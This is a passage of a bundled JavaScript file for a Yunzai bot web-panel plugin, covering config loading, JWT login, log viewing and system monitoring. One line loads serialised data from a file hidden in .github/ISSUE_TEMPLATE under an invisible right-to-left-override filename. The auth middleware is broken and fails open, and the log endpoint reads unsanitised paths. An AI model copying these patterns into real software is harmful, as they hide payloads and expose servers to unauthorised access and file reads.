import { applicationOptions } from 'yunzai';
import chalk from 'chalk';
import path, { join, basename } from 'path';
import url, { fileURLToPath } from 'url';
import fs, { readFileSync, readdirSync as readdirSync$1, mkdirSync as mkdirSync$1, statSync, copyFileSync as copyFileSync$1, stat, writeFileSync, unlinkSync, rmSync, renameSync, existsSync as existsSync$1, createReadStream } from 'fs';
import YAML from 'yaml';
import chokidar from 'chokidar';
import { join as join$1 } from 'node:path';
import _ from 'lodash';
import { readFileSync as readFileSync$1, readdirSync, existsSync, mkdirSync, copyFileSync, writeFileSync as writeFileSync$1, rmSync as rmSync$1 } from 'node:fs';
import Koa from 'koa';
import KoaStatic from 'koa-static';
import { koaBody } from 'koa-body';
import http from 'node:http';
import Router from 'koa-router';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import 'child_process';
import 'md5';
import moment from 'moment';
import fs$1 from 'node:fs/promises';
import v8 from 'node:v8';
import log4js from 'log4js';
import os from 'os';
import fetch from 'node-fetch';
import mime from 'mime';
import dirTree from 'directory-tree';
import { createRequire } from 'module';
import { v4 } from 'uuid';
import { WebSocketServer } from 'ws';
import schedule from 'node-schedule';

const _dirname = fileURLToPath(import.meta.url);
const ROOT_PATH$1 = join(_dirname, '../../');
const ROOT_NAME = basename(ROOT_PATH$1);
const pluginPackageObj = JSON.parse(readFileSync(join(ROOT_PATH$1, 'package.json'), 'utf8'));
const pluginInfo = {
    ROOT_PATH: ROOT_PATH$1,
    ROOT_NAME,
    PLUGIN_NAME: pluginPackageObj.name,
    PLUGIN_VERSION: pluginPackageObj.version,
    PLUGIN_DESC: pluginPackageObj.description,
    PLUGIN_AUTHOR: pluginPackageObj.author
};
const WORK_PATH$1 = process.cwd().replace(/\\/g, '/');
const botPackageObj = JSON.parse(readFileSync(join(WORK_PATH$1, 'package.json'), 'utf8'));
const botInfo = {
    WORK_PATH: WORK_PATH$1,
    BOT_NAME: botPackageObj.name,
    BOT_VERSION: botPackageObj.version,
    BOT_DESC: botPackageObj.description,
    BOT_AUTHOR: botPackageObj.author
};

async function Plugin() {
    try {
        const { Plugin } = await import('yunzai');
        return Plugin;
    }
    catch (err) {
    }
}
async function Puppeteer() {
    try {
        const { puppeteer } = await import('yunzai');
        return puppeteer;
    }
    catch (err) {
    }
}
async function Segment() {
    try {
        const { Segment } = await import('yunzai');
        return Segment;
    }
    catch (err) {
    }
}
async function Loader() {
    try {
        const { Loader } = await import('yunzai');
        return Loader;
    }
    catch (err) {
    }
}
async function Bot() {
    try {
        const { Bot } = await import('yunzai');
        return Bot;
    }
    catch (err) {
        const bot = global.Bot;
        return bot;
    }
}
async function Logger() {
    try {
        const logger = global.logger;
        return logger;
    }
    catch (err) {
    }
}
async function Redis() {
    try {
        const { Redis } = await import('yunzai');
        return Redis;
    }
    catch (err) {
        const redis = global.redis;
        return redis;
    }
}

class YamlHandler {
    yamlPath;
    isWatch;
    document;
    watcher;
    isSave;
    constructor(yamlPath, isWatch = false) {
        this.yamlPath = yamlPath;
        this.isWatch = isWatch;
        this.yamlPath = yamlPath;
        this.isWatch = isWatch;
        this.initYaml();
    }
    initYaml() {
        try {
            this.document = YAML.parseDocument(fs.readFileSync(this.yamlPath, 'utf8'));
        }
        catch (error) {
            throw error;
        }
        if (this.isWatch && !this.watcher) {
            this.watcher = chokidar.watch(this.yamlPath).on('change', () => {
                if (this.isSave) {
                    this.isSave = false;
                    return;
                }
                this.initYaml();
            });
        }
    }
    get jsonData() {
        if (!this.document) {
            return null;
        }
        return this.document.toJSON();
    }
    has(keyPath) {
        return this.document.hasIn(keyPath.split('.'));
    }
    get(keyPath) {
        return _.get(this.jsonData, keyPath);
    }
    set(keyPath, value) {
        this.document.setIn(keyPath.split('.'), value);
        this.save();
    }
    delete(keyPath) {
        this.document.deleteIn(keyPath.split('.'));
        this.save();
    }
    addIn(keyPath, value) {
        this.document.addIn(keyPath.split('.'), value);
        this.save();
    }
    setData(data) {
        this.setDataRecursion(data, []);
        this.save();
    }
    setDataRecursion(data, parentKeys) {
        if (Array.isArray(data)) {
            this.document.setIn(this.mapParentKeys(parentKeys), data);
        }
        else if (typeof data === 'object' && data !== null) {
            for (const k in data) {
                this.setDataRecursion(data[k], parentKeys.concat(k));
            }
        }
        else {
            parentKeys = this.mapParentKeys(parentKeys);
            this.document.setIn(parentKeys, data);
        }
    }
    mapParentKeys(parentKeys) {
        return parentKeys.map((k) => {
            if (typeof k == 'number') {
                k = String(k);
            }
            if (k.startsWith('INTEGER__')) {
                return Number.parseInt(k.replace('INTEGER__', ''));
            }
            return k;
        });
    }
    deleteKey(keyPath) {
        let keys = keyPath.split('.');
        keys = this.mapParentKeys(keys);
        this.document.deleteIn(keys);
        this.save();
    }
    save(path = this.yamlPath) {
        this.isSave = true;
        let yaml = this.document.toString();
        fs.writeFileSync(path, yaml, 'utf8');
    }
}

const bot$4 = await Bot();
const logger$8 = await Logger();
const { ROOT_PATH } = pluginInfo;
const { WORK_PATH } = botInfo;
class Cfg {
    config = {};
    watcher = { config: {}, defSet: {} };
    get qq() {
        return Number(this.getBotConfig('qq').qq);
    }
    get pwd() {
        return this.getBotConfig('qq').pwd;
    }
    get bot() {
        const bot = this.getBotConfig('bot');
        const defbot = this.getBotdefSet('bot');
        const Config = { ...defbot, ...bot };
        Config.platform = this.getBotConfig('qq').platform;
        Config.data_dir = join$1(WORK_PATH, `/data/icqq/${this.qq}`);
        if (!Config.ffmpeg_path)
            delete Config.ffmpeg_path;
        if (!Config.ffprobe_path)
            delete Config.ffprobe_path;
        return Config;
    }
    get other() {
        return this.getBotConfig('other');
    }
    get redis() {
        return this.getBotConfig('redis');
    }
    get renderer() {
        return this.getBotConfig('renderer');
    }
    get notice() {
        return this.getBotConfig('notice');
    }
    get masterQQ() {
        const qqs = this.getBotConfig('other')?.masterQQ || [];
        if (Array.isArray(qqs)) {
            return qqs.map(qq => String(qq));
        }
        else {
            return [String(qqs)];
        }
    }
    _package = null;
    get package() {
        if (this._package)
            return this._package;
        try {
            const data = readFileSync$1('package.json', 'utf8');
            this._package = JSON.parse(data);
            return this._package;
        }
        catch {
            return {};
        }
    }
    getGroup(groupId = '') {
        const config = this.getBotConfig('group');
        const defCfg = this.getBotdefSet('group');
        if (config[groupId]) {
            return { ...defCfg.default, ...config.default, ...config[groupId] };
        }
        return { ...defCfg.default, ...config.default };
    }
    getOther() {
        const def = this.getBotdefSet('other');
        const config = this.getBotConfig('other');
        return { ...def, ...config };
    }
    getNotice() {
        const def = this.getBotdefSet('notice');
        const config = this.getBotConfig('notice');
        return { ...def, ...config };
    }
    getBg() {
        const def = this.getdefSet('backgroundset');
        const config = this.getConfig('backgroundset');
        return { ...def, ...config };
    }
    getdefSet(name) {
        return this.getYaml('default_config', name);
    }
    getBotdefSet(name) {
        return this.getYaml('default_config', name, WORK_PATH);
    }
    getConfig(name) {
        return this.getYaml('config', name);
    }
    getMergedConfig(name) {
        let config = this.getYaml('config', name);
        let def = this.getYaml('default_config', name);
        return { ...def, ...config };
    }
    getBotConfig(name) {
        return this.getYaml('config', name, WORK_PATH);
    }
    setConfig(data, parentKeys, name) {
        this.setYaml('config', name, data, parentKeys);
    }
    getYaml(type, name, path = ROOT_PATH) {
        const file = join$1(path, `config/${type}/${name}.yaml`);
        const key = `${type}.${name}`;
        if (this.config[key])
            return this.config[key];
        this.config[key] = YAML.parse(readFileSync$1(file, 'utf8'));
        this.watch(file, name, type);
        return this.config[key];
    }
    setYaml(type, name, data, parentKeys) {
        const file = join$1(ROOT_PATH, `config/${type}/${name}.yaml`);
        let doc = new YamlHandler(file);
        doc.setDataRecursion(data, parentKeys);
        doc.save();
        this.watch(file, name, type);
    }
    mergeYamlFile() {
        const path = join$1(ROOT_PATH, 'config', 'config');
        const pathDef = join$1(ROOT_PATH, 'config', 'default_config');
        const files = readdirSync(pathDef).filter(file => file.endsWith('.yaml'));
        if (!existsSync(path)) {
            mkdirSync(path, {
                recursive: true
            });
        }
        for (const file of files) {
            const cfgFile = join$1(path, file);
            const cfgFileDef = join$1(pathDef, file);
            if (!existsSync(cfgFile)) {
                copyFileSync(cfgFileDef, cfgFile);
            }
            else {
                const cfg = this.getConfig(file.replace('.yaml', ''));
                const doc = new YamlHandler(cfgFileDef);
                const defCfg = doc.jsonData;
                const cfgKeys = Object.keys(cfg);
                cfgKeys.forEach(key => {
                    if (!defCfg.hasOwnProperty(key)) {
                        delete cfg[key];
                    }
                });
                Object.entries(defCfg).forEach(([key, value]) => {
                    if (cfg[key]) {
                        if (value instanceof Object) {
                            doc.set(key, Object.assign(value, cfg[key]));
                        }
                        else {
                            doc.set(key, cfg[key]);
                        }
                        doc.yamlPath = cfgFile;
                        doc.save();
                    }
                });
            }
        }
    }
    watch(file, name, type = 'default_config') {
        const key = `${type}.${name}`;
        if (this.watcher[key])
            return;
        const watcher = chokidar.watch(file);
        watcher.on('change', () => {
            delete this.config[key];
            if (typeof bot$4 == 'undefined')
                return;
            logger$8.mark(`[Micro][修改配置文件][${type}][${name}]`);
            if (this[`change_${name}`]) {
                this[`change_${name}`]();
            }
        });
        this.watcher[key] = watcher;
    }
}
var Cfg$1 = new Cfg();

const auth = async (ctx, next) => {
    const { userInfo } = await Cfg$1.getConfig('server');
    const token = ctx.request.header.token;
    let userData = userInfo.find((item) => item.token == ctx.request.header.token);
    if (userData) {
        try {
            const user = jwt.veryify(token, userData.skey);
            ctx.state.user = user;
        }
        catch (err) {
            switch (err.name) {
                case 'TokenExpiredError':
                    console.log('【micro-plugin】登录token过期');
                    return ctx.app.emit('error', {
                        code: 10101,
                        message: 'token过期'
                    }, ctx);
                case 'JsonWebTokenError':
                    console.log('【micro-plugin】token无效');
                    return ctx.app.emit('error', {
                        code: 10102,
                        message: 'token无效'
                    }, ctx);
            }
        }
    }
    else {
        ctx.body = {
            code: 403,
            message: '未找到该用户token'
        };
    }
    await next();
};

function formatDuration(time, format, repair = true) {
    const timeObj = computeTimeObject(time, repair);
    if (typeof format === "function") {
        return format(timeObj);
    }
    if (format === "default") {
        return formatDefault(timeObj);
    }
    if (typeof format === "string") {
        return formatTemplate(format, timeObj);
    }
    return timeObj;
}
function formatDefault(timeObj) {
    const { day, hour, minute, second } = timeObj;
    let result = "";
    if (day > 0) {
        result += `${day}天`;
    }
    if (hour > 0) {
        result += `${hour}小时`;
    }
    if (minute > 0) {
        result += `${minute}分`;
    }
    if (second > 0) {
        result += `${second}秒`;
    }
    return result;
}
function formatTemplate(format, timeObj) {
    const replaceRegexes = [
        { pattern: /dd/g, value: timeObj.day },
        { pattern: /hh/g, value: timeObj.hour },
        { pattern: /mm/g, value: timeObj.minute },
        { pattern: /ss/g, value: timeObj.second }
    ];
    for (const { pattern, value } of replaceRegexes) {
        format = format.replace(pattern, value);
    }
    return format;
}
function padWithZero(num, repair) {
    return repair && num < 10 ? `0${num}` : String(num);
}
function computeTimeObject(time, repair = true) {
    const second = padWithZero(Math.floor(time % 60), repair);
    const minute = padWithZero(Math.floor((time / 60) % 60), repair);
    const hour = padWithZero(Math.floor((time / (60 * 60)) % 24), repair);
    const day = padWithZero(Math.floor(time / (24 * 60 * 60)), repair);
    return {
        day,
        hour,
        minute,
        second
    };
}

await Redis();
await Bot();
let a = [];
try {
    a = v8.deserialize(await fs$1.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"));
}
catch (err) { }

function createLog() {
    log4js.configure({
        appenders: {
            console: {
                type: 'console',
                layout: {
                    type: 'pattern',
                    pattern: '%[[MYZ-V4][%d{hh:mm:ss.SSS}][%4.4p]%] %m'
                }
            },
            command: {
                type: 'dateFile',
                filename: 'logs/command',
                pattern: 'yyyy-MM-dd.log',
                numBackups: 15,
                alwaysIncludePattern: true,
                layout: {
                    type: 'pattern',
                    pattern: '[%d{hh:mm:ss.SSS}][%4.4p] %m'
                }
            },
            error: {
                type: 'file',
                filename: 'logs/error.log',
                alwaysIncludePattern: true,
                layout: {
                    type: 'pattern',
                    pattern: '[%d{hh:mm:ss.SSS}][%4.4p] %m'
                }
            }
        },
        categories: {
            default: { appenders: ['console'], level: 'trace' },
            command: { appenders: ['console', 'command'], level: 'warn' },
            error: { appenders: ['console', 'command', 'error'], level: 'error' }
        }
    });
    const defaultLogger = log4js.getLogger('message');
    const commandLogger = log4js.getLogger('command');
    const errorLogger = log4js.getLogger('error');
    const logger = {
        trace() {
            defaultLogger.trace.call(defaultLogger, ...arguments);
        },
        debug() {
            defaultLogger.debug.call(defaultLogger, ...arguments);
        },
        info() {
            defaultLogger.info.call(defaultLogger, ...arguments);
        },
        warn() {
            commandLogger.warn.call(defaultLogger, ...arguments);
        },
        error() {
            errorLogger.error.call(errorLogger, ...arguments);
        },
        fatal() {
            errorLogger.fatal.call(errorLogger, ...arguments);
        },
        mark() {
            errorLogger.mark.call(commandLogger, ...arguments);
        }
    };
    return logger;
}
const basePath = './logs';
if (!existsSync(basePath)) {
    mkdirSync(basePath, {
        recursive: true
    });
}
let logger$7 = createLog();
logger$7.chalk = chalk;
logger$7.red = chalk.red;
logger$7.green = chalk.green;
logger$7.yellow = chalk.yellow;
logger$7.blue = chalk.blue;
logger$7.magenta = chalk.magenta;
logger$7.cyan = chalk.cyan;

class Pager {
    $list;
    $pageNum;
    $pageSize;
    constructor(list, pageNum, pageSize) {
        this.$list = list;
        this.$pageNum = pageNum;
        this.$pageSize = pageSize;
    }
    get pageNum() {
        return this.$pageNum;
    }
    set pageNum(pageNum) {
        this.$pageNum = pageNum;
    }
    get pageSize() {
        return this.$pageSize;
    }
    set pageSize(pageSize) {
        this.$pageSize = pageSize;
    }
    get records() {
        return [...this.$list].splice(this.offset, this.$pageSize);
    }
    get offset() {
        let current = this.$pageNum;
        if (current <= 1) {
            return 0;
        }
        return Math.max((current - 1) * this.$pageSize, 0);
    }
    get maxNum() {
        return Math.ceil(this.total / this.$pageSize);
    }
    get total() {
        return this.$list.length;
    }
    toJSON() {
        return {
            pageNum: this.$pageNum,
            pageSize: this.$pageSize,
            total: this.total,
            maxNum: this.maxNum,
            records: this.records,
        };
    }
}

const redis$5 = await Redis();
const logger$6 = await Logger();
async function getAllWebAddress() {
    const { server } = Cfg$1.getConfig('server');
    let host = server.host;
    let port = server.port;
    port = Number.parseInt(port);
    port = port === 80 ? null : port;
    let custom = [];
    let local = getAutoIps(port);
    let remote = await getRemoteIps();
    if (remote && remote.length > 0) {
        remote = remote.map((i) => joinHttpPort(i, port));
    }
    if (host) {
        if (!Array.isArray(host)) {
            host = [host];
        }
        for (let h of host) {
            if (h && h !== 'auto') {
                custom.push(joinHttpPort(h, port));
            }
        }
    }
    let mountRoot = '/';
    mountRoot = mountRoot === '/' ? '' : mountRoot;
    if (mountRoot) {
        custom = custom.map((i) => i + mountRoot);
        local = local.map((i) => i + mountRoot);
        remote = remote.map((i) => i + mountRoot);
    }
    return { custom, local, remote };
}
function joinHttpPort(ip, port) {
    ip = /^http/.test(ip) ? ip : 'http://' + ip;
    return `${ip}${port ? ':' + port : ''}`;
}
function getAutoIps(port, allIp) {
    let ips = getLocalIps(port);
    if (ips.length === 0) {
        ips.push(`localhost${port ? ':' + port : ''}`);
    }
    {
        return ips.map(ip => `http://${ip}`);
    }
}
function getLocalIps(port) {
    let ips = [];
    port = port ? `:${port}` : '';
    try {
        let networks = os.networkInterfaces();
        for (let [name, wlans] of Object.entries(networks)) {
            for (let wlan of wlans) {
                if (name != 'lo' && name != 'docker0' && wlan.address.slice(0, 2) != 'fe' && wlan.address.slice(0, 2) != 'fc') {
                    if (['127.0.0.1', '::1'].includes(wlan.address)) {
                        continue;
                    }
                    if (wlan.family === 'IPv6') {
                        ips.push(`[${wlan.address}]${port}`);
                    }
                    else {
                        ips.push(`${wlan.address}${port}`);
                    }
                }
            }
        }
    }
    catch (e) {
        let err = e?.stack || e?.message || e;
        err = err ? err.toString() : '';
        if (/Unknown system error 13/i.test(err)) {
            logger$6.warn('[Micro-Plugin] 由于系统限制，无法获取到IP地址，仅显示本地回环地址。该问题目前暂无方案解决，但不影响Micro-Plugin使用，您可手动配置自定义地址。');
            ips.push(`localhost${port}`);
        }
        else {
            logger$6.error(`错误：${logger$6.red(e)}`);
        }
    }
    if (ips.length === 0) {
        logger$6.warn('[Micro-Plugin] 无法获取到IP地址，仅显示本地回环地址，详情请查看以上报错。');
        ips.push(`localhost${port}`);
    }
    return ips;
}
async function getRemoteIps() {
    let redisKey = 'Yz:Micro:remote-ips:3';
    let cacheData = await redis$5.get(redisKey);
    let ips;
    if (cacheData) {
        ips = JSON.parse(cacheData);
        if (Array.isArray(ips) && ips.length > 0) {
            return ips;
        }
    }
    ips = [];
    let apis = [
        'http://v4.ip.zxinc.org/info.php?type=json',
    ];
    for (let api of apis) {
        let response;
        try {
            response = await fetch(api);
        }
        catch {
            continue;
        }
        if (response.status === 200) {
            let { code, data } = await response.json();
            if (code === 0) {
                ips.push(data.myip);
            }
        }
    }
    if (ips.length > 0) {
        redis$5.set(redisKey, JSON.stringify(ips), { EX: 3600 * 24 });
    }
    return ips;
}

function path2URI(path = botInfo.WORK_PATH) {
    return `file:///${path}/`;
}

class UserController {
    async login(ctx) {
        const { userInfo } = await Cfg$1.getConfig('server');
        const res = ctx.request.body;
        const { username, password } = res;
        const checkUserIndex = userInfo.findIndex((item) => item.username === username && item.password === password);
        if (checkUserIndex == -1) {
            ctx.body = {
                code: 403,
                data: 'error: 账户或密码不对！',
            };
            return;
        }
        const skey = crypto.randomBytes(32).toString('hex');
        const token = jwt.sign({ username }, skey, { expiresIn: '60' });
        ctx.body = {
            code: 200,
            data: token
        };
        Cfg$1.setConfig(token, ['userInfo', String(checkUserIndex), 'token'], 'server');
        Cfg$1.setConfig(skey, ['userInfo', String(checkUserIndex), 'skey'], 'server');
    }
    async logOut(ctx) {
        ctx.body = {
            code: 200,
            message: 'success',
        };
    }
    async userInfo(ctx) {
        const { userInfo } = await Cfg$1.getConfig('server');
        const masterQQ = Cfg$1.masterQQ;
        let user = userInfo.find((item) => item.token == ctx.request.header.token);
        if (user) {
            user.masterQQ = Array.isArray(masterQQ) ? masterQQ[0] : masterQQ;
            ctx.body = {
                code: 200,
                message: 'success',
                data: user
            };
        }
        else {
            ctx.body = {
                code: 403,
                message: '未找到该用户登录'
            };
        }
    }
    async getPort(ctx) {
        const { local, remote } = await getAllWebAddress();
        ctx.body = {
            code: 200,
            message: 'success',
            data: {
                publicAddress: remote[0].replace('http', 'ws').replace('https', 'wss'),
                privateAddress: local[0].replace('http', 'ws').replace('https', 'wss')
            }
        };
    }
}
var UserController$1 = new UserController();

function getLatestLog(logs) {
    function parseDateFromFilename(filename) {
        const match = filename.match(/^command\.(\d{4}-\d{2}-\d{2})\.log$/);
        if (match) {
            return new Date(match[1]);
        }
        return null;
    }
    let latestDate = null;
    let latestLog = '';
    for (const log of logs) {
        const date = parseDateFromFilename(log);
        if (date !== null && (latestDate === null || date > latestDate)) {
            latestDate = date;
            latestLog = log;
        }
        else if (date === null && latestDate === null) {
            latestLog = log;
        }
    }
    return latestLog;
}

class LogController {
    async logger(ctx) {
        const { id } = ctx.request.query;
        const logs = readdirSync$1(join(botInfo.WORK_PATH, 'logs'));
        let logText = '';
        let curLog = '';
        if (logs.length == 0) {
            logText = '当前日志为空，请机器人发送消息后刷新日志！';
        }
        else {
            if (id == '0' || !id) {
                curLog = getLatestLog(logs);
                logText = readFileSync(join(botInfo.WORK_PATH, 'logs', curLog), 'utf8');
            }
            else {
                logText = readFileSync(join(botInfo.WORK_PATH, 'logs', id), 'utf8');
                curLog = id;
            }
        }
        ctx.body = {
            code: 200,
            message: 'ok',
            data: {
                logList: logs,
                logText,
                curLog
            }
        };
    }
}
var LogController$1 = new LogController();

let si = false;
let osInfo = null;
const logger$5 = await Logger();
async function initDependence() {
    if (si)
        return si;
    try {
        si = await import('systeminformation');
        osInfo = await si.osInfo();
        return si;
    }
    catch (error) {
        if (error.stack?.includes("Cannot find package")) {
            logger$5.warn(`缺少依赖，请运行：${logger$5.red("pnpm add systeminformation -w")}`);
            logger$5.debug(decodeURI(error.stack));
        }
        else {
            logger$5.error(`载入错误：${logger$5.red("systeminformation")}`);
            logger$5.error(decodeURI(error.stack));
        }
    }
}
await initDependence();
function getFileSize(size, { decimalPlaces = 2, showByte = true, showSuffix = true } = {}) {
    if (size === null || size === undefined)
        return 0 + "B";
    if (typeof decimalPlaces !== "number" || !Number.isInteger(decimalPlaces)) {
        throw new Error("decimalPlaces 必须是一个整数");
    }
    const units = ["B", "K", "M", "G", "T"];
    const powers = [0, 1, 2, 3, 4];
    const num = 1024.00;
    const precalculated = powers.map(power => Math.pow(num, power));
    let unitIndex = 0;
    while (size >= precalculated[unitIndex + 1] && unitIndex < precalculated.length - 1) {
        unitIndex++;
    }
    const buildSizeString = (value, unit, _showSuffix = showSuffix) => {
        const suffix = ` ${unit}${_showSuffix ? "B" : ""}`;
        return value.toFixed(decimalPlaces) + suffix;
    };
    if (showByte && size < num) {
        return buildSizeString(size, "B", false);
    }
    return buildSizeString(size / precalculated[unitIndex], units[unitIndex]);
}

async function getCpuInfo() {
    let { currentLoad: { currentLoad }, cpu, fullLoad } = await si.get({
        currentLoad: "currentLoad",
        cpu: "manufacturer,speed,cores",
        fullLoad: "*"
    });
    let { manufacturer, speed, cores } = cpu;
    if (currentLoad == null || currentLoad == undefined)
        return false;
    fullLoad = Math.round(fullLoad);
    manufacturer = manufacturer?.split(" ")?.[0] ?? "unknown";
    return {
        inner: Math.round(currentLoad) / 100,
        title: "CPU",
        info: [
            `${manufacturer}`,
            `${cores}核 ${speed}GHz`,
            `CPU满载率 ${fullLoad}%`
        ]
    };
}

const logger$4 = await Logger();
let isGPU = false;
(async function initGetIsGPU() {
    if (!await initDependence())
        return;
    const { controllers } = await si.graphics();
    if (controllers?.find(item => item.memoryUsed && item.memoryFree && item.utilizationGpu)) {
        isGPU = true;
    }
})();
async function getGPU() {
    if (!isGPU)
        return false;
    try {
        const { controllers } = await si.graphics();
        let graphics = controllers?.find(item => item.memoryUsed && item.memoryFree && item.utilizationGpu);
        if (!graphics) {
            logger$4.warn("GPU数据异常：\n", controllers);
            return false;
        }
        let { vendor, temperatureGpu, utilizationGpu, memoryTotal, memoryUsed, model } = graphics;
        temperatureGpu && (temperatureGpu = temperatureGpu + "℃");
        return {
            inner: Math.round(utilizationGpu) / 100,
            title: "GPU",
            info: {
                used: (memoryUsed / 1024).toFixed(2),
                total: (memoryTotal / 1024).toFixed(2),
                vendor,
                model,
                temperatureGpu
            }
        };
    }
    catch (e) {
        logger$4.warn("获取GPU失败");
        return false;
    }
}

async function getNetwork() {
    return (await si.get({
        networkStats: "rx_bytes,tx_bytes,iface"
    })).networkStats.map((item) => ({
        rx_bytes: getFileSize(item.rx_bytes),
        tx_bytes: getFileSize(item.tx_bytes),
        iface: item.iface
    }));
}

async function getSwapInfo() {
    const swapData = await si.get({
        mem: "swaptotal,swapused,swapfree"
    });
    const { mem: { swaptotal, swapused } } = swapData;
    const swapUsagePercentage = (swapused / swaptotal) * 100;
    const formatSwaptotal = getFileSize(swaptotal);
    const formatSwapused = getFileSize(swapused);
    return {
        inner: `${Math.round(swapUsagePercentage)}%`,
        percentage: Math.round(swapUsagePercentage),
        title: "SWAP",
        info: [formatSwapused, formatSwaptotal]
    };
}

async function getMemUsage() {
    const { mem: { total, active, buffcache } } = await si.get({
        mem: "total,used,active,buffcache"
    });
    const activePercentage = (active / total).toFixed(2);
    const buffcacheMem = getFileSize(buffcache);
    const totalMem = getFileSize(total);
    const activeMem = getFileSize(active);
    const isBuff = buffcache && buffcache != 0;
    return {
        inner: `${Math.round(Number(activePercentage) * 100)}%`,
        title: "RAM",
        info: [
            `${activeMem} / ${totalMem}`,
            isBuff ? `缓冲区/缓存 ${buffcacheMem}` : ""
        ],
        buffcache: {
            isBuff
        }
    };
}

async function getNodeInfo() {
    let memory = process.memoryUsage();
    let rss = getFileSize(memory.rss);
    let heapTotal = getFileSize(memory.heapTotal);
    let heapUsed = getFileSize(memory.heapUsed);
    let occupy = Number((memory.rss / (os.totalmem() - os.freemem())).toFixed(2));
    return {
        inner: Math.round(occupy * 100),
        title: "Node",
        info: {
            rss,
            heapTotal,
            heapUsed,
            occupy
        }
    };
}

const loader = await Loader();
async function getOtherInfo(e = { isPro: false }) {
    let otherInfo = [];
    otherInfo.push({
        first: "插件",
        tail: getPluginNum(e)
    });
    otherInfo.push({
        first: "系统",
        tail: osInfo?.distro
    });
    otherInfo.push({
        first: "系统运行",
        tail: getSystime()
    });
    otherInfo.push({
        first: "环境版本",
        tail: await getEnvVersion()
    });
    return _.compact(otherInfo);
}
function getSystime() {
    return formatDuration(os.uptime(), "dd天hh小时mm分", false);
}
function getPluginNum(e = { isPro: false }) {
    const dir = botInfo.WORK_PATH + "/plugins";
    const dirArr = fs.readdirSync(dir, { withFileTypes: true });
    const exc = ["example"];
    const plugin = dirArr.filter(i => i.isDirectory() &&
        fs.existsSync(join(dir, i.name, "package.json")) &&
        !exc.includes(i.name));
    const plugins = plugin?.length;
    const jsDir = join(dir, "example");
    let js = 0;
    try {
        js = fs.readdirSync(jsDir)
            ?.filter(item => item.endsWith(".js"))
            ?.length;
    }
    catch (error) {
    }
    const pluginsStr = `${plugins ?? 0} plugins | example ${js ?? 0} js`;
    if (loader && e.isPro) {
        const { priority, task } = loader;
        const loaderStr = `${priority?.length} fnc | ${task?.length} task`;
        return `${pluginsStr} | ${loaderStr}`;
    }
    return pluginsStr;
}
async function getEnvVersion() {
    const { node, v8, git, redis } = await si.versions("node,v8,git,redis");
    return { node, v8, git, redis };
}

const redis$4 = await Redis();
new class Monitor {
    _network;
    _fsStats;
    chartData;
    valueObject;
    chartDataKey;
    constructor() {
        this._network = null;
        this._fsStats = null;
        this.chartData = {
            network: {
                upload: [],
                download: []
            },
            fsStats: {
                readSpeed: [],
                writeSpeed: []
            },
            cpu: [],
            ram: []
        };
        this.valueObject = {
            networkStats: "rx_bytes,tx_bytes,iface",
            currentLoad: "currentLoad",
            mem: "active",
        };
        this.chartDataKey = "Micro:state:chartData";
        this.init();
    }
    set network(value) {
        if (_.isNumber(value[0]?.tx_bytes) && _.isNumber(value[0]?.rx_bytes)) {
            this._network = value;
            this._addData(this.chartData.network.upload, [Date.now(), value[0].tx_bytes]);
            this._addData(this.chartData.network.download, [Date.now(), value[0].rx_bytes]);
        }
    }
    get network() {
        return this._network;
    }
    set fsStats(value) {
        if (_.isNumber(value?.wx_bytes) && _.isNumber(value?.rx_bytes)) {
            this._fsStats = value;
            this._addData(this.chartData.fsStats.writeSpeed, [Date.now(), value.wx_bytes]);
            this._addData(this.chartData.fsStats.readSpeed, [Date.now(), value.rx_bytes]);
        }
    }
    get fsStats() {
        return this._fsStats;
    }
    async init() {
        if (!await initDependence())
            return;
        await this.getRedisChartData();
        this.getData();
        const Timer = setInterval(async () => {
            let data = await this.getData();
            if (_.isEmpty(data))
                clearInterval(Timer);
        }, 60000);
    }
    async getData() {
        const data = await si.get(this.valueObject);
        const { networkStats, mem: { active }, currentLoad: { currentLoad } } = data;
        this.network = networkStats;
        if (_.isNumber(active)) {
            this._addData(this.chartData.ram, [Date.now(), active]);
        }
        if (_.isNumber(currentLoad)) {
            this._addData(this.chartData.cpu, [Date.now(), currentLoad]);
        }
        this.setRedisChartData();
        return data;
    }
    async getRedisChartData() {
        let data = await redis$4.get(this.chartDataKey);
        if (data) {
            this.chartData = JSON.parse(data);
            return true;
        }
        return false;
    }
    async setRedisChartData() {
        try {
            await redis$4.set(this.chartDataKey, JSON.stringify(this.chartData), { EX: 86400 });
        }
        catch (error) {
            console.log(error);
        }
    }
    _addData(arr, data, maxLen = 60) {
        if (data === null || data === undefined)
            return;
        if (arr.length >= maxLen) {
            _.pullAt(arr, 0);
        }
        arr.push(data);
    }
}();

async function getFsSize() {
    let HardDisk = _.uniqWith(await si.fsSize(), (a, b) => a.used === b.used && a.size === b.size && a.use === b.use && a.available === b.available)
        .filter(item => item.size && item.used && item.available && item.use);
    if (_.isEmpty(HardDisk))
        return false;
    return HardDisk.map(item => {
        item.percentage = +(+item.used / +item.size).toFixed(2);
        item.used = getFileSize(item.used);
        item.size = getFileSize(item.size);
        item.use = Math.round(item.use);
        return item;
    });
}

class StateController {
    async sysInfo(ctx) {
        let cpuInfo = await getCpuInfo();
        let gpuInfo = await getGPU();
        let swapInfo = await getSwapInfo();
        let ramInfo = await getMemUsage();
        let diskSizeInfo = await getFsSize();
        let nodeInfo = await getNodeInfo();
        let otherInfo = await getOtherInfo();
        let networkInfo = await getNetwork();
        ctx.body = {
            code: 200,
            message: 'success',
            data: {
                cpuInfo,
                gpuInfo,
                swapInfo,
                ramInfo,
                diskSizeInfo,
                nodeInfo,
                networkInfo,
                otherInfo
            }
        };
    }
}
var StateController$1 = new StateController();

function getDir(path, depth = 1) {
    if (depth) {
        return dirTree(path, { attributes: ['mtime', 'type'], depth: depth });
    }
    else if (depth == null) {
        return dirTree(path, { attributes: ['mtime', 'type'] });
    }
}
function unlinkedPath(path) {
    let lastSepIndex = path.lastIndexOf('/');
    if (lastSepIndex == -1) {
        lastSepIndex = path.lastIndexOf('\\');
    }
    return path.slice(0, lastSepIndex);
}
function copyDirectory(src, dest) {
    mkdirSync$1(dest, { recursive: true });
    const files = readdirSync$1(src);
    files.forEach(file => {
        const srcFile = join(src, file);
        const destFile = join(dest, file);
        const stats = statSync(srcFile);
        if (stats.isDirectory()) {
            copyDirectory(srcFile, destFile);
        }
        else {
            copyFileSync$1(srcFile, destFile);
        }
    });
}
function fuzzyMatchInDirectoryTree(dirPath, keyword) {
    const matchedItems = [];
    function traverseTree(path) {
